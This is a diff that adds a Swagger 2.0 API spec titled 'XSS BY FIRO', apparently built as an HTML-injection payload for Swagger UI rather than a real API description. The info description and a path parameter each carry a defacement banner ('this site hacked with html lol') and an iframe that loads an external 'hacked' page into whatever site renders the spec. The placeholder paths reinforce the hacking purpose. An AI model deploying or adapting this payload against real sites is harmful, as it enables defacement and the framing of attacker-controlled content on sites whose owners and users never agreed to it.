@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS BY FIRO
+  description: |
+    <center><h1>this site hacked with html lol </h1></center><iframe src="https://mchklt.github.io/hacked.html" width="100%" height="300" style="border:1px solid black;"> </iframe>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /MCHKLT:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - MCHKLT_XSS
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <center><h1>this site hacked with html lol </h1></center><iframe src="https://mchklt.github.io/hacked.html" width="100%" height="300" style="border:1px solid black;"> </iframe>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
